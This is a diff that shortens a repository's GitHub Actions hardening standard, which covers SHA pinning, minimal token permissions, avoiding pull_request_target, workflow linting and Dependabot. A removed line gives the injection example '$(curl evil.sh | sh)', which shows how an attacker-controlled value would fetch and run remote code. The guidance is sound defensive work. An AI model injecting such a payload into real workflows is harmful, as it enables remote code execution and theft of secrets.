@@ -1,79 +1,55 @@
-# GitHub Actions hardening standard
+# GitHub Actions hardening
 
-Every workflow in `.github/workflows/` follows the rules below. They exist
-to limit the blast radius of a compromised action, a malicious pull
-request, or a leaked token. A change that relaxes any of these needs a
-matching change to this document and a note in the pull request explaining
-why.
+Every workflow in `.github/workflows/` follows these rules. They limit the
+blast radius of a compromised action, a malicious pull request, or a leaked
+token. A change that relaxes one changes this file too and says why in its
+commit message.
+
+`tools/lint-workflows.sh` enforces the machine-checkable rules and runs
+inside `pixi run tests`. It drives `actionlint` (which needs `shellcheck`
+for `run:` bodies), `zizmor --offline --config zizmor.yml`,
+`check-jsonschema` against the vendored Dependabot schema, and
+`tools/check_action_pins.py`. Any failure fails the run.
 
 ## Pin every action to a commit SHA
 
-Every `uses:` names a full 40-hexadecimal commit SHA, followed by a
-`# vX.Y.Z` comment recording the human-readable release it corresponds to:
+Every `uses:` names a full 40-hex commit SHA followed by the release it
+corresponds to:
 
 ```yaml
 uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
 ```
 
-Tag refs (`@v7`, `@v7.0.1`) and branch refs (`@main`) are mutable: the
-owner, or an attacker who compromises the owner's account, can repoint them
-at new code without the SHA changing. A pinned SHA is immutable. Dependabot
-(see below) proposes SHA bumps as pull requests, keeping the `# vX.Y.Z`
-comment in sync.
+Tags and branches are mutable; a SHA is not. Resolve the SHA from the
+release tag yourself, never from a value pasted from documentation.
 
-When adding or bumping an action, resolve the SHA from the release tag
-yourself (GitHub's "releases" page, or the API) rather than trusting a
-value pasted from documentation.
+`zizmor.yml` sets the `unpinned-uses` policy to `hash-pin`, so a tag or
+branch ref fails offline. `check_action_pins.py` fails offline on a
+missing or malformed `# vX.Y.Z` comment or an upper-case SHA, and online
+resolves each tag through the GitHub API (following annotated tags) and
+fails unless it names the pinned commit. Any network failure is fatal;
+`pixi run tests -- --offline` is the only way to skip the online check.
 
-The workflow lint enforces this in two stages. `zizmor`'s `unpinned-uses`
-audit runs offline and fails any `uses:` that is not pinned to a full
-commit SHA; `zizmor.yml` at the repo root sets its blanket policy to
-`hash-pin`, and the lint passes `--config zizmor.yml` explicitly so a
-missing or unreadable policy file aborts the run instead of falling back
-to zizmor's built-in default. `tools/check_action_pins.py` then covers
-the `# vX.Y.Z` comment: it fails offline on a SHA pin whose comment is
-missing or malformed or whose SHA is upper-case, and online it resolves
-each `# vX.Y.Z` tag against the GitHub API, follows an annotated tag to
-its target commit, and fails if that commit is not the pinned SHA. A
-mismatch, a missing tag, a rate-limit response, or an unreachable API all
-fail the run: there is no quiet pass when the check cannot confirm a pin.
-CI runs it with the job's `GITHUB_TOKEN` for rate-limit headroom. Offline
-local work that cannot reach the API runs `pixi run tests -- --offline`,
-which skips the online resolution and any other check that needs the
-network; the SHA-shape and comment checks still run.
+A confirmed `zizmor` false positive is silenced inline with `# zizmor:
+ignore[<rule>]` and a one-line reason. A genuine finding is fixed, never
+suppressed.
 
-## Start with no permissions, grant per job
+## Start with no permissions
 
-Each workflow sets `permissions: {}` at the top level, which drops the
-`GITHUB_TOKEN` to no scopes. Every job then re-grants only the scopes it
-uses, e.g.:
+Each workflow sets `permissions: {}` at the top level, and each job grants
+only the scopes it uses. Only the Scorecard job holds more than `contents:
+read`: `security-events: write` and `id-token: write`.
 
-```yaml
-permissions:
-  contents: read
-```
+## Never `pull_request_target`
 
-The Scorecard workflow is the only one that needs more (`security-events:
-write` to upload findings, `id-token: write` to publish via OIDC); it
-grants exactly those on the single job that needs them.
+Workflows trigger on `push` and `pull_request` only. `pull_request_target`
+runs with a read-write token and secrets while checking out untrusted code.
 
-## `pull_request`, never `pull_request_target`
+## Never interpolate event context into shell
 
-Workflows trigger on `push` and `pull_request` only. `pull_request` runs
-the workflow from the base of the fork with a read-only token and no
-access to secrets, so untrusted PR code cannot exfiltrate anything.
-`pull_request_target` runs the base repo's workflow with a read-write
-token and secrets in scope while checking out PR code; it is a standing
-privilege-escalation risk and is not used here.
-
-## Do not interpolate event context into shell
-
-No `run:` step embeds `${{ github.event.* }}` (PR titles, branch names,
-commit messages, author fields, ...) or any other attacker-controllable
-`${{ }}` expression directly in the script body. Those strings are
-substituted before the shell parses the line, so a crafted value such as
-`$(curl evil.sh | sh)` executes. Pass the value through `env:` and
-reference it as a quoted shell variable instead:
+No `run:` body contains `${{ github.event.* }}` or any other
+attacker-controllable expression, because it is substituted before the
+shell parses the line. Pass it through `env:` and quote the variable:
 
 ```yaml
 - env:
@@ -81,81 +57,22 @@ reference it as a quoted shell variable instead:
   run: echo "$TITLE"
 ```
 
-`ci.yml` carries a comment restating this rule at the point future steps
-would be added.
+## Pinned runner, harden-runner first
 
-## Pin the runner image
+`runs-on` names a dated image (`ubuntu-24.04`), never `ubuntu-latest`, so
+an OS upgrade is never an unplanned side effect of an unrelated push.
+`step-security/harden-runner` with `egress-policy: audit` is the first step
+of every job, building the baseline for a later move to `block`.
 
-`runs-on` names a dated image (`ubuntu-24.04`), not `ubuntu-latest`. The
-`latest` alias rolls to a new OS major version on GitHub's schedule, which
-turns an unrelated push into the first (unplanned) test of the new image.
-
-## harden-runner on every job
-
-`step-security/harden-runner` is the first step of every job, with
-`egress-policy: audit`. In audit mode it records outbound network
-connections without blocking them, which builds the baseline needed before
-any future move to `egress-policy: block`. Being first means it is in
-place before any other action runs.
-
-## Concurrency
-
-`ci.yml` declares a `concurrency` group keyed on
-`${{ github.workflow }}-${{ github.ref }}` with `cancel-in-progress: true`,
-so a new push to a branch cancels that branch's in-flight run instead of
-queueing behind it.
+`ci.yml` cancels a branch's in-flight run on a new push (`concurrency`
+keyed on workflow and ref).
 
 ## Dependency updates
 
-`.github/dependabot.yml` enables weekly updates for:
+`.github/dependabot.yml` proposes weekly SHA bumps for `github-actions`
+and watches `pip` for anything later added to `[project.dependencies]`.
+Dependabot cannot read pixi, so `pixi.lock` is refreshed by hand with
+`pixi update`.
 
-- `github-actions`: SHA bumps for the pinned `uses:` refs above.
-- `pip`: Python dependencies declared in `pyproject.toml`. That set is
-  empty today, so the entry exists to catch dependencies added to
-  `[project.dependencies]` later. The conda-side toolchain and FreeCAD come
-  from pixi, which Dependabot cannot see.
-
-Dependabot has no pixi support, so `pixi.lock` is refreshed by hand with
-`pixi update` when the conda-side toolchain needs to move.
-
-## OpenSSF Scorecard
-
-`.github/workflows/scorecard.yml` runs `ossf/scorecard-action` on
-`branch_protection_rule`, a weekly `schedule`, and `push` to `main`. It
-uploads SARIF results to code scanning and publishes to the public
-Scorecard dataset. Treat a dropping score as a regression to investigate.
-
-## Enforcement: the workflow lint
-
-`tools/lint-workflows.sh` enforces the machine-verifiable rules from this
-document. `pixi run tests` runs it after the unit suite and before the
-FreeCAD smoke test, so CI needs no dedicated workflow-lint job; to run
-only this lint, call `bash tools/lint-workflows.sh` from inside
-`pixi shell`.
-
-One invocation drives four tools: `actionlint`, `zizmor`,
-`check-jsonschema` against the vendored Dependabot schema, and
-`tools/check_action_pins.py`. All four run every time and any failure
-fails the run. Three things about that are not visible from the code:
-
-- **`zizmor` suppressions and the pin policy.** A confirmed false positive
-  is silenced with an inline `# zizmor: ignore[<rule>]` comment carrying a
-  one-line reason; a genuine finding is fixed, never suppressed.
-  `zizmor.yml` sets the `unpinned-uses` blanket policy to `hash-pin`, so a
-  tag or branch `uses:` fails the audit. That the policy file is loaded and
-  its key path honored (rather than the run silently coasting on zizmor
-  1.30.0's matching default) was checked against zizmor 1.30.0 in commit
-  `743672f`, whose since-removed `tests/test_zizmor_pin_policy.py` drove a
-  tag pin through the real config, a policy-flipped config, and a missing
-  config. That coverage was dropped afterward: it tested a third-party
-  tool's behavior, not this repo's code.
-- **Offline versus online.** `actionlint`, `zizmor --offline`, the
-  Dependabot schema check, and `check_action_pins.py`'s `# vX.Y.Z`
-  comment check are offline and deterministic, so the lint stays
-  reproducible without network access. Only the SHA resolution in
-  `check_action_pins.py` uses the network: it confirms each pinned SHA is
-  the commit its `# vX.Y.Z` tag names, is fatal on any network failure
-  (mismatch, missing tag, rate limit, persistent 5xx, unreachable API),
-  and `pixi run tests -- --offline` is the only way to skip it.
-- **`shellcheck` is a `pixi.toml` dependency** because `actionlint` shells
-  out to it to lint every `run:` script body.
+`.github/workflows/scorecard.yml` runs OpenSSF Scorecard weekly and on
+push to `main`. A dropping score is a regression to investigate.
